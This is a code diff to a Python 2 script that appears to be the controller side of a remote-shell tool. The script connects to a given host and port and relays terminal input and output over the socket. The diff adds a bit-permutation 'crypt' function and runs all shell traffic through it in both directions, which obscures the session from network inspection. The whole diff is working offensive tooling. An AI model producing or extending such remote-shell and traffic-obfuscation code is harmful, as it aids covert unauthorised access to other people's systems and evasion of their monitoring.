@@ -1,6 +1,17 @@
 import socket, pty, tty, select
 import sys, os
 
+def crypt( xxx, key = [ 7,6,5,4,3,2,1,0 ] ):
+    def perm( c ):
+        """ This function is remap one byte to another
+            with bit-permutations.
+            perm^2 === 1
+        """
+        s = bin( ord( c ) )[ 2: ].rjust( 8, '0' )                                  ## 3 --> 00000011
+        return chr( int( ''.join([ s[ key[ i ] ] for i in xrange( 8 ) ]), 2 ) )    ## return char( int( 11000000 ) )
+    return ''.join( map( perm, xxx ) )
+
+
 if len( sys.argv ) < 3:
     print "[x] Usage: %s [host] [port]" % ( sys.argv[0] )
 else:
@@ -32,9 +43,9 @@ else:
             #print r, str( [ fsock, pty.STDIN_FILENO ] )
 
             if fsock in r:
-                dat = os.read( fsock, 1000 )
+                dat = crypt( os.read( fsock, 1000 ) )      ## decrypting...
                 if dat:
-                    dat = dat.replace( '\x01', '' )    ## strip out magic byte
+                    dat = dat.replace( '\x01', '' )        ## strip out magic byte
                     os.write( pty.STDOUT_FILENO, dat )
                 else:
                     print "[!] client close connection....\r"
@@ -42,5 +53,5 @@ else:
 
             if pty.STDIN_FILENO in r:
                 dat = os.read( pty.STDIN_FILENO, 1000 )
-                os.write( fsock, dat )
+                os.write( fsock, crypt( dat ) )            ## encrypting...
 
